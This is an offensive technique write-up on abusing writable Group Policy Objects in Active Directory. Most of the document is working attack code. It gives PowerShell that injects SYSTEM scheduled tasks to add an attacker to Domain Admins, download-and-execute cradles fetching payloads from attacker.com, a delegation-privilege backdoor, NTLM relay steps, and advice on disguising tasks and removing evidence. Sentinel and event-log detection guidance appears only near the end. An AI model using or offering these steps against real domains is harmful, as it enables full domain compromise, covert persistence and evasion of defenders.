# [PE-POLICY-001]: GPO Abuse for Persistence & Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-001 |
| **MITRE ATT&CK v18.1** | [T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/) |
| **Tactic** | Privilege Escalation, Domain Policy Modification |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A (Design flaw, not a vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2008 - 2025; All Active Directory versions supporting GPOs |
| **Patched In** | Not patched (architectural limitation); requires detection and operational hardening |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** GPO abuse for persistence and escalation is a critical privilege escalation technique that exploits misconfigured permissions on Group Policy Objects (GPOs) in Active Directory environments. An attacker with write access to a GPO can modify Group Policy settings to inject malicious scheduled tasks, scripts, registry modifications, or user rights that execute on all computers or users linked to that GPO. Unlike most privilege escalation techniques, GPO abuse requires **no credentials stealing, no exploits, and no tools execution on targets**—the attacker modifies centralized policy files, and Windows enforces the malicious policy domain-wide. A single compromised account with GPO edit rights (or an over-delegated group) can escalate to Domain Admin status and maintain persistent access for months or years without detection.

**Attack Surface:** The primary attack surfaces include:
- Overly permissive GPO access control lists (ACLs) granting write/edit rights to non-administrative users or groups
- GPOs linked to high-value OUs containing domain controllers, admin workstations, or domain admin user accounts
- SYSVOL share containing GPO policy files (SMB share accessible via `\\domain\SYSVOL\domain\Policies\{GUID}\`)
- Misconfigured security filtering that fails to restrict GPO scope
- User rights assignments (e.g., SeEnableDelegationPrivilege) enabled via GPO, creating subtle backdoors

**Business Impact:** **Catastrophic domain compromise with persistent backdoor access.** An attacker can: (1) add themselves to the Domain Admins group on all computers via scheduled task GPO; (2) disable security software (Windows Defender, EDR) via registry policy changes; (3) create persistent backdoors via scheduled tasks or logon scripts that execute as SYSTEM; (4) monitor all users logging into targeted systems (e.g., admin workstations) and capture credentials; (5) deploy ransomware or cryptominers at scale across the entire domain; (6) modify user rights to grant SeEnableDelegationPrivilege, enabling Kerberos delegation attacks and complete domain takeover.

**Technical Context:** GPO abuse can typically be executed in **under 5 minutes** once GPO write access is confirmed. The exploitation chain follows: Identify writable GPO → Determine linked OUs and scope → Inject malicious policy (scheduled task, script, or privilege assignment) → Wait for GPO refresh cycle (every 90 minutes by default for computers, 120 minutes for users) → Attacker gains access with the privileges of the policy context (typically SYSTEM for computer policies). Detection likelihood is **medium-to-low** if GPO changes are not audited, but **high** if Event IDs 5136/5137 (Directory Service Changes) are monitored and SYSVOL file modifications are tracked.

### Operational Risk

- **Execution Risk:** Medium - Requires write access to a GPO, but exploitation is guaranteed if conditions are met; no exploit reliability concerns.
- **Stealth:** Low - GPO modifications are logged (if auditing is enabled) and create directory service events; however, many organizations do not monitor these events.
- **Reversibility:** No - Requires Active Directory restore from backup; backdoors created via GPO must be manually reversed, which is time-consuming.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.3, 5.2.3.4 | Group Policy delegation must be restricted to minimal personnel; GPO permissions should be reviewed regularly |
| **DISA STIG** | V-73795, V-73797 | Group Policy modification must be restricted; unauthorized GPO changes must be audited |
| **CISA SCuBA** | AD-4.1 | Active Directory must enforce least-privilege access controls on all administrative objects including GPOs |
| **NIST 800-53** | AC-3, AC-6, AU-2 | Access enforcement; least privilege; audit events for privileged operations |
| **GDPR** | Art. 32 | Security of processing - appropriate technical measures to ensure confidentiality and integrity |
| **DORA** | Art. 9, Art. 16 | Protection and prevention measures; incident management and reporting |
| **NIS2** | Art. 21 | Cyber risk management measures including access control and audit logging |
| **ISO 27001** | A.9.2.3, A.12.2.3 | Management of privileged access rights; logging and monitoring of privileged activity |
| **ISO 27005** | Risk Scenario - Compromise of Authentication Authority | Unauthorized modification of centralized policy enabling domain-wide attack escalation |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Write/Edit permissions on at least one GPO (can be non-administrative account if permissions are misconfigured)
- **For escalation:** GPO must be linked to an OU containing target computers or users (e.g., Domain Controllers OU, Admin Workstations OU, or Domain root)
- **For Domain Admin escalation:** Access to a GPO linked to Domain Controllers OU or a GPO that applies to a domain admin user account

**Required Access:**
- Network access to SYSVOL share (`\\domain\SYSVOL\domain\Policies\{GUID}\`)
- Access to Active Directory or LDAP to modify GPO containers (GPC) or verify permissions
- Or access to Windows domain-joined workstation with GPMC (Group Policy Management Console) and edit rights on target GPO

**Supported Versions:**
- **Windows Server:** 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Active Directory:** All versions supporting GPOs (Windows Server 2000+)
- **PowerShell:** Version 5.0+ (for automation tools like SharpGPOAbuse, New-GPOImmediateTask)
- **Group Policy Processing:** All Windows Server and client OS versions

**Tools:**
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (C# tool for GPO modification)
- [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) (Python implementation)
- [GroupPolicyBackdoor.py / GPOddity](https://github.com/synacktiv/gpoddity) (NTLM relay + GPO exploit)
- [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell) (PowerShell function for scheduled task injection)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Version 1.5.1+; detects GPO abuse paths)
- [gpoParser.py](https://github.com/synacktiv/gpoParser) (GPO enumeration and misconfiguration detection)
- [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned) (PowerShell to find writable GPOs)
- Group Policy Management Console (GPMC.exe; built-in on Windows Server / RSAT)
- LDAP tools: [ldapsearch](https://linux.die.net/man/1/ldapsearch), [ldeep](https://github.com/ropnop/ldeep)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Step 1: Load Group Policy Module
Import-Module GroupPolicy

# Step 2: List all GPOs in the domain
Get-GPO -All | Select-Object DisplayName, Id, Owner, GpoStatus

# Step 3: Identify GPOs you have edit access to
Get-GPO -All | ForEach-Object {
  $gpo = $_
  $perms = Get-GPPermission -Guid $gpo.Id -All
  if ($perms | Where-Object {$_.Permission -like "*Edit*" -and $_.Trustee -notlike "BUILTIN\*" -and $_.Trustee -notlike "NT AUTHORITY\*"}) {
    Write-Host "WRITABLE GPO: $($gpo.DisplayName) - Owner: $($gpo.Owner)"
    $perms | Where-Object {$_.Permission -like "*Edit*"} | ForEach-Object {
      Write-Host "  Trustee: $($_.Trustee) - Permission: $($_.Permission)"
    }
  }
}

# Step 4: Check where GPOs are linked (to determine scope/impact)
$gpoName = "Target GPO Name"
$gpo = Get-GPO -Name $gpoName
Get-GPOReport -Guid $gpo.Id -ReportType Links -Path "C:\gpo-links.html"
# Review output to see which OUs the GPO applies to
```

**What to Look For:**
- If output shows your user/group in the "Trustee" column with "Edit" permission → GPO is modifiable
- Check linked OUs: Domain Controllers OU = high-value target; Admin Workstations OU = can capture admin credentials; Domain root = affects all computers

**Version Note:** Commands are identical across Windows Server 2008-2025. PowerShell 5.0+ required.

### Linux/Bash / LDAP Reconnaissance

```bash
# Step 1: Query LDAP for all GPOs
ldapsearch -x -h DC_IP -D "CN=user,CN=Users,DC=domain,DC=com" -W \
  -b "CN=Policies,CN=System,DC=domain,DC=com" \
  '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath

# Step 2: Parse permissions on specific GPO (requires ldapnthash or AD query)
ldeep ldap -u username -p password -s DC_IP -d domain.com gpo

# Step 3: Check if SYSVOL is accessible (not always required)
smbclient -N //domain_controller/SYSVOL
ls

# Step 4: Check GPO security filtering and WMI filters
# This requires parsing GPO XML files in SYSVOL; typically done offline
```

**What to Look For:**
- If SYSVOL is accessible without credentials → potential for direct file modification
- gPCFileSysPath shows network path to GPO policy files
- Any non-standard groups with Edit permissions = misconfiguration opportunity

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Scheduled Task Injection via SharpGPOAbuse (Immediate)

**Supported Versions:** Windows Server 2008+ (all AD versions)

#### Step 1: Identify a Writable GPO Linked to High-Value OU

**Objective:** Find a GPO with write permissions that applies to domain controllers or admin workstations.

**Command (PowerShell):**

```powershell
# Find all GPOs with write access
$gpos = Get-GPO -All | ForEach-Object {
  $gpo = $_
  $perms = Get-GPPermission -Guid $gpo.Id -All
  $writable = $perms | Where-Object {
    $_.Permission -like "*Edit*" -and `
    $_.Trustee -eq $env:USERNAME -or $_.Trustee -eq "$env:USERDOMAIN\$env:USERNAME"
  }
  if ($writable) {
    $gpo
  }
}

# For each writable GPO, determine where it's linked
$gpos | ForEach-Object {
  $gpo = $_
  Write-Host "=== GPO: $($gpo.DisplayName) ==="
  
  # Query linked OUs from LDAP
  $ADSearcher = [adsisearcher]"(gPLink=*$($gpo.Id.ToString().Insert(0,'CN={')).Insert(37,'}')*)"
  $LinkedOUs = $ADSearcher.FindAll() | ForEach-Object { $_.Path }
  
  $LinkedOUs | ForEach-Object {
    Write-Host "Linked to: $_"
    # Extract OU path
    $ouPath = $_ -replace "LDAP://",""
    # Check if it contains sensitive objects
    if ($ouPath -like "*Domain Controllers*" -or $ouPath -like "*Admin*") {
      Write-Host "  [+] HIGH VALUE TARGET! Contains Domain Controllers or Admin accounts"
    }
  }
}
```

**Expected Output:**

```
=== GPO: TestGPO ===
Linked to: LDAP://OU=Servers,DC=corp,DC=com
  [+] HIGH VALUE TARGET! Contains Domain Controllers or Admin accounts
```

**What This Means:**
- You have identified a writable GPO that applies to sensitive systems
- Exploitation will affect all computers in the linked OU when GPO refresh occurs

**OpSec & Evasion:**
- Query minimally to avoid alerting admins to reconnaissance activity
- Select a GPO already in use (avoid creating new ones if possible)
- Detection likelihood: Medium (if LDAP queries are monitored)

**Troubleshooting:**
- **Error:** "Access Denied" when querying GPO permissions
  - **Cause:** User does not have sufficient AD query rights
  - **Fix:** Ensure user has at least "Read" permissions on the GPO object in AD
- **Error:** "GPO not found"
  - **Cause:** Typo in GPO name or GPO was deleted
  - **Fix:** Verify GPO exists via `Get-GPO -All`

#### Step 2: Download and Execute SharpGPOAbuse

**Objective:** Prepare and compile SharpGPOAbuse tool, then inject malicious scheduled task into target GPO.

**Command (Compile on Windows with Visual Studio or build tools):**

```bash
# Download SharpGPOAbuse from GitHub
git clone https://github.com/FSecureLABS/SharpGPOAbuse.git
cd SharpGPOAbuse

# Build the C# project (requires Visual Studio or MSBuild)
msbuild.exe SharpGPOAbuse.sln /property:Configuration=Release

# Output: bin/Release/SharpGPOAbuse.exe
```

**Command (Execute against target GPO):**

```powershell
# Create scheduled task that adds current user to Domain Admins group
$domainName = (Get-ADDomain).Name
$command = "net.exe"
$arguments = "/c net group ""Domain Admins"" attacker_user /add /domain"

.\SharpGPOAbuse.exe `
  --AddComputerTask `
  --GpoName "TestGPO" `
  --TaskName "Windows Update Check" `
  --Author "NT AUTHORITY\SYSTEM" `
  --Command "$command" `
  --Arguments "$arguments"
```

**Expected Output:**

```
[+] GPO modified successfully!
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

**What This Means:**
- Malicious scheduled task has been injected into the GPO's XML configuration
- When computers in the linked OU refresh GPO (typically every 90 minutes), the task will execute
- Task runs as SYSTEM on all affected computers
- Attacker's user account will be added to Domain Admins group

**OpSec & Evasion:**
- Use legitimate-sounding task names (Windows Update, Security Scan, Maintenance)
- Avoid using attacker IP addresses in commands; use DNS names or relay through internal systems
- Scheduled tasks run as SYSTEM, so detection via process execution is hard
- Remove the malicious task immediately after confirming access (to minimize forensic evidence)
- Detection likelihood: High if GPO changes and SYSVOL file modifications are monitored

**Troubleshooting:**
- **Error:** "Access to the path denied"
  - **Cause:** Insufficient NTFS permissions on SYSVOL GPO folder
  - **Fix:** GPO edit rights don't always grant filesystem rights; request admin to add NTFS Write permission
- **Error:** "GPO refresh did not execute task"
  - **Cause:** Security filtering or WMI filtering excluded the target computer
  - **Fix:** Check GPO scope via `Get-GPOReport` and verify target computer matches filtering rules

#### Step 3: Verify Task Execution and Confirm Escalation

**Objective:** Confirm that the scheduled task executed and attacker is now Domain Admin.

**Command (Check Domain Admins membership):**

```powershell
# Check if your account is now in Domain Admins
$user = "$env:USERDOMAIN\$env:USERNAME"
$daGroup = Get-ADGroup -Identity "Domain Admins"
$members = Get-ADGroupMember -Identity $daGroup

if ($members | Where-Object {$_.SamAccountName -eq $env:USERNAME}) {
  Write-Host "[+] SUCCESS: $user is now a member of Domain Admins!"
} else {
  Write-Host "[-] FAILED: $user is not in Domain Admins yet. GPO may not have refreshed."
}

# Force GPO refresh on target computer to speed up execution
# (Note: This requires admin rights on the target; normally wait 90 minutes)
gpupdate /force
```

**Expected Output:**

```
[+] SUCCESS: CORP\attacker_user is now a member of Domain Admins!
```

**What This Means:**
- Privilege escalation is confirmed
- Attacker now has complete control over the Active Directory domain
- Can modify any AD object, reset admin passwords, create backdoor accounts, etc.

**OpSec & Evasion:**
- Clean up the malicious task from the GPO immediately after confirming access
- Remove yourself from Domain Admins and create a backdoor account instead
- Verification should be done from a location where your access is expected (admin workstation)
- Detection likelihood: High (if ad-hoc group membership changes are monitored)

**Troubleshooting:**
- **Error:** "Task did not execute at all"
  - **Cause:** (1) Computer hasn't refreshed GPO yet, (2) Computer is offline, (3) Task is filtered by WMI/security filter
  - **Fix:** Wait 90+ minutes, verify computer is online, check WMI filters on GPO

#### Step 4: Create Persistent Backdoor via SeEnableDelegationPrivilege

**Objective:** Establish persistence by granting SeEnableDelegationPrivilege to a backdoor account, enabling future Kerberos delegation attacks even if Domain Admin access is lost.

**Command (Modify GPO to assign privilege):**

```powershell
# Grant SeEnableDelegationPrivilege to backdoor account via GPO
# This modifies \Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf

$backdoorUser = "CORP\backdoor_user"

# Export the GPO to a backup
$gpoGUID = (Get-GPO -Name "TestGPO").Id
Backup-GPO -Name "TestGPO" -Path "C:\GPOBackup"

# Modify GptTmpl.inf to include SeEnableDelegationPrivilege
$gptPath = "C:\GPOBackup\{$gpoGUID}\DomainSysvol\GPO\MACHINE\Microsoft\Windows NT\SecEdit"
$gptFile = "$gptPath\GptTmpl.inf"

# Read current content
$content = Get-Content $gptFile

# Add privilege assignment
$privAssignment = @"
[Privilege Rights]
SeEnableDelegationPrivilege = $backdoorUser
"@

$content += $privAssignment
Set-Content -Path $gptFile -Value $content

# Restore GPO to domain
Restore-GPO -Path "C:\GPOBackup\{$gpoGUID}" -TargetName "TestGPO"

Write-Host "[+] SeEnableDelegationPrivilege assigned to $backdoorUser"
```

**Expected Output:**

```
[+] SeEnableDelegationPrivilege assigned to CORP\backdoor_user
```

**What This Means:**
- Backdoor account now has the ability to enable Kerberos delegation on computer/user accounts
- Even if attacker loses Domain Admin access, they can use backdoor account to escalate via delegation attacks
- Represents a subtle, long-term persistence mechanism that is difficult to detect

**OpSec & Evasion:**
- Create a hidden, unprivileged backdoor account in an obscure OU
- This privilege is rarely audited and is extremely persistent
- Exploit window is wide: privilege grants can be leveraged weeks or months after initial compromise
- Detection likelihood: Very Low (unless privilege assignment changes are specifically audited)

---

### METHOD 2: New-GPOImmediateTask PowerShell Function (Two-Stage)

**Supported Versions:** Windows Server 2008+ (requires PowerShell 5.0+)

#### Step 1: Set Up New-GPOImmediateTask Function

**Objective:** Load the PowerShell function that automates malicious scheduled task injection into GPO.

**Command (Define function):**

```powershell
function New-GPOImmediateTask {
  <#
  .SYNOPSIS
    Creates an 'Immediate' scheduled task in a GPO for one-time execution as SYSTEM.
  
  .PARAMETER GPODisplayName
    Name of the target GPO.
  
  .PARAMETER TaskName
    Name of the scheduled task to create.
  
  .PARAMETER Command
    Command to execute (default: powershell.exe).
  
  .PARAMETER CommandArguments
    Arguments to pass to the command.
  
  .PARAMETER SysPath
    Path to SYSVOL, e.g., '\\domain.com\sysvol\domain.com'.
  #>
  
  [CmdletBinding()]
  param(
    [Parameter(Mandatory=$true)] [string]$GPODisplayName,
    [Parameter(Mandatory=$true)] [string]$TaskName,
    [string]$Command = "powershell.exe",
    [Parameter(Mandatory=$true)] [string]$CommandArguments,
    [string]$SysPath,
    [switch]$Force
  )
  
  try {
    # Import GPO module
    Import-Module GroupPolicy -ErrorAction Stop
    
    # Get target GPO
    $gpo = Get-GPO -Name $GPODisplayName
    Write-Host "[+] Target GPO: $($gpo.DisplayName) (GUID: $($gpo.Id))"
    
    # Backup GPO
    $backupPath = "C:\GPOBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    Write-Host "[+] Backing up GPO to: $backupPath"
    Backup-GPO -Name $GPODisplayName -Path $backupPath | Out-Null
    
    # Extract backup GUID
    $backupGUID = (Get-ChildItem $backupPath -Directory).Name
    $gptPath = "$backupPath\$backupGUID\DomainSysvol\GPO\MACHINE\Preferences\ScheduledTasks"
    
    # Create ScheduledTasks.xml with malicious immediate task
    $taskXML = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <ImmediateTaskV2 clsid="{9756B586-76A6-4ee0-8BBC-6A2E31287E6B}" name="$TaskName">
    <Properties Action="Create">
      <Task version="1.3">
        <RegistrationInfo>
          <Author>NT AUTHORITY\SYSTEM</Author>
          <Description/>
          <URI>\$TaskName</URI>
        </RegistrationInfo>
        <Triggers>
          <TimeTrigger>
            <Enabled>true</Enabled>
            <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
            <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
          </TimeTrigger>
        </Triggers>
        <Settings>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        </Settings>
        <Actions Context="System">
          <Exec>
            <Command>$Command</Command>
            <Arguments>$CommandArguments</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
"@
    
    # Create directory if not exist
    New-Item -ItemType Directory -Path $gptPath -Force | Out-Null
    
    # Write XML
    Set-Content -Path "$gptPath\ScheduledTasks.xml" -Value $taskXML
    Write-Host "[+] Malicious task XML created"
    
    # Restore GPO (imports modified backup into domain)
    Write-Host "[+] Restoring modified GPO to domain..."
    Restore-GPO -Path $backupPath -TargetName $GPODisplayName -Force:$Force
    
    Write-Host "[+] SUCCESS: Malicious immediate task injected!"
    Write-Host "[+] Task will execute on next GPO refresh cycle (90 minutes for computers)"
    Write-Host "[+] To speed up execution on target: gpupdate /force"
  }
  catch {
    Write-Error "Failed to inject task: $_"
  }
}
```

**What This Means:**
- Function is now available in current PowerShell session
- Ready to inject malicious tasks into target GPOs

**OpSec & Evasion:**
- Define function in memory only; do not save to disk
- Execute via PowerShell Empire or Cobalt Strike for OPSEC
- Detection likelihood: Medium (if PowerShell script block logging is enabled)

#### Step 2: Execute Malicious Task Injection

**Objective:** Inject malicious scheduled task into target GPO using the New-GPOImmediateTask function.

**Command:**

```powershell
$sysvol = "\\corp.com\sysvol\corp.com"
$taskName = "Windows Defender Update"
$command = "powershell.exe"
$arguments = "-NoP -W Hidden -C `"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stager.ps1')`""

New-GPOImmediateTask -GPODisplayName "TestGPO" `
  -TaskName "$taskName" `
  -Command "$command" `
  -CommandArguments "$arguments" `
  -SysPath "$sysvol" `
  -Force
```

**Expected Output:**

```
[+] Target GPO: TestGPO (GUID: {5F400B8A-5F8D-475E-AC3A-5A1C5A7AAF0B})
[+] Backing up GPO to: C:\GPOBackup_20260109_094502
[+] Malicious task XML created
[+] Restoring modified GPO to domain...
[+] SUCCESS: Malicious immediate task injected!
[+] Task will execute on next GPO refresh cycle (90 minutes for computers)
```

**What This Means:**
- Attacker has injected a reverse shell PowerShell command into a GPO-managed scheduled task
- When computers in the linked OU refresh GPO, they will download and execute the attacker's payload
- Payload runs as SYSTEM on all affected computers

**OpSec & Evasion:**
- Use encrypted or obfuscated PowerShell payloads
- Host stager.ps1 on attacker-controlled C&C server
- Use DNS tunneling or HTTPS to avoid firewall alerts
- Detection likelihood: High if outbound PowerShell downloads are blocked

#### Step 3: Clean Up and Cover Tracks

**Objective:** Remove evidence of GPO modification to evade forensic detection.

**Command (Remove malicious task from GPO):**

```powershell
# Step 3a: Remove the malicious task from GPO
$gpo = Get-GPO -Name "TestGPO"
$gpoGUID = $gpo.Id

# Backup current state (for recovery if needed)
Backup-GPO -Name "TestGPO" -Path "C:\GPOBackup_CleanUp"

# Remove scheduled task by re-importing original backup (if available)
# Otherwise, manually edit SYSVOL file to remove task XML

$sysvol = "\\corp.com\sysvol\corp.com"
$taskXMLPath = "$sysvol\Policies\{$gpoGUID}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml"

# Read XML
[xml]$xmlContent = Get-Content $taskXMLPath

# Remove malicious immediate task
$maliciousTask = $xmlContent.ScheduledTasks.ImmediateTaskV2 | `
  Where-Object {$_.name -eq "Windows Defender Update"}

if ($maliciousTask) {
  $xmlContent.ScheduledTasks.RemoveChild($maliciousTask) | Out-Null
  $xmlContent.Save($taskXMLPath)
  Write-Host "[+] Malicious task removed from XML"
}

# Force GPO refresh to propagate cleanup
gpupdate /force

Write-Host "[+] GPO cleaned. Changes may take 90 minutes to fully revert."
```

**Expected Output:**

```
[+] Malicious task removed from XML
[+] GPO cleaned. Changes may take 90 minutes to fully revert.
```

**What This Means:**
- Attacker has attempted to remove evidence of compromise
- However, audit logs (Event IDs 5136) may still show the modification
- If forensics are performed, deleted task data may be recoverable from VSS or backups

---

### METHOD 3: NTLM Relay to GPO Abuse (GPOddity)

**Supported Versions:** Windows Server 2008-2022 (vulnerable to NTLM relay attacks)

#### Step 1: Set Up NTLM Relay Attack

**Objective:** Capture NTLM authentication traffic and relay it to Active Directory to modify GPO ACLs without needing direct write permissions.

**Command (Linux attack station - using gpOddity tool):**

```bash
# Download gpOddity (GPO exploitation via NTLM relay)
git clone https://github.com/synacktiv/gpoddity.git
cd gpoddity

# Step 1a: Start NTLM relay listener
# This intercepts NTLM authentication and relays to DC
ntlmrelayx.py -t ldap://DC_IP --no-http-server -socks

# Step 2b: In another terminal, trigger authentication
# Common methods: Print Spooler service, LLMNR/mDNS spoofing, fake file shares
# For this example, assume we've captured NTLM from a domain user

# Step 1c: Relay NTLM to DC to modify GPO
# The relay automatically elevates permissions through LDAP

# Step 2: Use the SOCKS proxy to access the relayed DC session
python3 gpb.py gpo inject \
  --domain 'corp.com' \
  --dc '127.0.0.1:1080' \
  --module modules_templates/ImmediateTask_create.ini \
  --gpo-name 'TestGPO'
```

**Expected Output:**

```
[+] NTLM relay established with DC
[+] GPO "TestGPO" modified successfully via relayed authentication
[+] Immediate task injected
```

**What This Means:**
- Attacker has modified GPO without having direct write permissions
- Relies on NTLM relay attack (requires capturing domain user authentication)
- More complex but more effective in restricted environments

**OpSec & Evasion:**
- NTLM relay attacks create network-level detections (if LDAP signing is not enforced)
- Avoid in environments where:
  - LDAP signing is enforced (makes relay impossible)
  - NTLM is disabled (use Kerberos-only environments)
  - Network inspection tools detect unsigned LDAP traffic
- Detection likelihood: Very High (NTLM relay is well-detected by modern EDR)

---

## 6. TOOLS & COMMANDS REFERENCE

### SharpGPOAbuse

**Version:** 1.0+
**Language:** C#
**Supported Platforms:** Windows (.NET Framework 4.5+)

**Download:** [GitHub - FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

**Installation:**

```bash
# Clone repository
git clone https://github.com/FSecureLABS/SharpGPOAbuse.git
cd SharpGPOAbuse

# Open SharpGPOAbuse.sln in Visual Studio
# Build → Release configuration
# Output: bin/Release/SharpGPOAbuse.exe

# Alternatively, use ILMerge to create a standalone executable
nuget install CommandLineParser -Version 1.9.3.15
msbuild SharpGPOAbuse.sln /p:Configuration=Release
ILMerge.exe /out:SharpGPOAbuse_Standalone.exe bin/Release/SharpGPOAbuse.exe bin/Release/CommandLine.dll
```

**Usage - Add Local Admin:**

```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "attacker_user" --GPOName "Vulnerable GPO"
```

**Usage - Add Scheduled Task:**

```
SharpGPOAbuse.exe --AddComputerTask --GPOName "Vulnerable GPO" --Author "NT AUTHORITY\SYSTEM" \
  --TaskName "Security Update" --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://attacker.com/shell'))"
```

### BloodHound (v1.5.1+)

**Version:** 1.5.1+
**Purpose:** Visualize GPO abuse attack paths

**Installation (Collector - SharpHound):**

```bash
# Download SharpHound
wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/SharpHound.ps1

# Run collection with GPO data
powershell -exec bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"

# This generates a ZIP file with ACLs, GPO links, and container structure
```

**Installation (Analyzer - Neo4j + BloodHound UI):**

```bash
# Install Neo4j Community Edition
wget https://neo4j.com/download/neo4j-community/
# Follow setup wizard

# Install BloodHound UI
wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
./BloodHound &

# Import SharpHound data into BloodHound
# Analyze "GPO abuse" paths in the UI
```

### gpoParser.py

**Version:** Latest
**Language:** Python 3
**Purpose:** Automated GPO enumeration and misconfiguration detection

**Installation:**

```bash
git clone https://github.com/synacktiv/gpoParser.git
cd gpoParser
pip3 install -r requirements.txt
```

**Usage:**

```bash
# Enumerate all GPOs from live AD
python3 gpoParser.py --domain corp.com --user attacker_user --password 'password' --dc DC_IP

# Output shows:
#   - All GPOs and their permissions
#   - Misconfigured ACLs
#   - Privilege assignments (SeEnableDelegationPrivilege, etc.)
#   - Linked OUs and scope
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect GPO Modification (Event ID 5136)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventCode, ObjectClass, AttributeLDAPDisplayName, SubjectUserName
- **Alert Severity:** High
- **Frequency:** Real-time (1 minute)
- **Applies To Versions:** All Windows Server versions with AD audit logging

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 5136
| where ObjectClass == "groupPolicyContainer"
| where AttributeLDAPDisplayName in ("displayName", "gPCFileSysPath", "nTSecurityDescriptor", "versionNumber", "gPCMachineExtensionNames")
| where SubjectUserName !in ("SYSTEM", "DomainControllers", "KRBTGT")
| project 
    TimeGenerated,
    SubjectUserName,
    ObjectName,
    AttributeLDAPDisplayName,
    AttributeValue,
    EventID,
    Computer
| order by TimeGenerated desc
```

**What This Detects:**
- Any modification to a Group Policy Container object
- Changes to critical attributes: ACLs, file paths, version numbers
- Excludes system accounts and legitimate services
- Catches immediate GPO abuse attempts

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect Group Policy Object Modification`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 minute`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

### Query 2: Detect GPO Creation (Event ID 5137)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventCode, ObjectClass, ObjectDN
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All Windows Server versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 5137
| where ObjectClass == "groupPolicyContainer"
| where SubjectUserName !in ("SYSTEM", "Administrator", "Domain Admins")
| project 
    TimeGenerated,
    SubjectUserName,
    SubjectComputerName,
    ObjectDN,
    EventID
| order by TimeGenerated desc
```

**What This Detects:**
- Creation of new GPO by non-administrative accounts
- Unusual GPO creation patterns (e.g., created then immediately linked to sensitive OU)
- Potential attacker-created GPOs for malicious purposes

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 5136 (A directory service object was modified)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** Any modification to AD object
- **Filter for GPO changes:** `ObjectClass = "groupPolicyContainer" AND AttributeLDAPDisplayName IN ("nTSecurityDescriptor", "gPCFileSysPath", "versionNumber")`
- **Applies To Versions:** Windows Server 2008+

**Event ID: 5137 (A directory service object was created)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** Creation of new AD object
- **Filter for new GPO:** `ObjectClass = "groupPolicyContainer"`
- **Applies To Versions:** Windows Server 2008+

**Event ID: 4698 (A scheduled task was created)**
- **Log Source:** Security (Domain Controller / Workstations)
- **Trigger:** Scheduled task created
- **Filter for suspicious tasks:** `TaskPath = "\Microsoft\Windows\*" AND NOT TaskName IN ("DefragBootFiles", "ProactiveScan", ...)`  [whitelist legitimate tasks]
- **Applies To Versions:** Windows Server 2008+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc) on Domain Controller
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Directory Service Access** and **Object Access**
4. Enable auditing:
   - **Directory Service Changes:** Success and Failure
   - **Other Object Access Events:** Success
5. Set SACL (System Access Control List) on:
   - `CN=Policies,CN=System,DC=corp,DC=com` (audit all GPO changes)
